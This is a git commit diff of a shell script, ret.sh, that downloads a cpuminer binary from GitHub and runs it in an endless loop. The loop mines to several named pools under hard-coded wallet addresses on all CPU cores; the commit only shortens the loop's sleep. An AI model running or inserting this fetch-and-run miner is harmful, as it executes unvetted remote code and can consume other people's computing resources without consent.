1f5207e9949de90029c5980059d0e121aba2776b
thepowert <96099226+thepowert@users.noreply.github.com>
2021-12-27 13:41:00 +0700

    Update ret.sh

--- ret.sh
+++ ret.sh
@@ -8,5 +8,5 @@ worker=${array[$index]}
 wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz && tar zxvf Cpuminer-opt-cpu-pool-linux64.tar.gz && echo '#!/bin/sh
 while [ 1 ]; do
 ./cpuminer -a yespower -o stratum+tcp://yespower.eu.mine.zpool.ca:6234 -u RA5S1Suf1BHvTiphQ3VRnWy6aShii374j5 -p c=VRSC -o stratum+tcp://murkapool.it:6253 -u CQ5axqsyHCmRvEraX88oa7obrPhHyqsNN7.bLuWex-$worker -p c=CPMK -o stratum+tcp://fpool.eu:6234 -u CQ5axqsyHCmRvEraX88oa7obrPhHyqsNN7.juNeD-$worker -p c=CPMK -t $(nproc --all) --$proxy
-sleep 5
+sleep 1
 done' > autominer.sh && chmod +x autominer.sh && ./autominer.sh
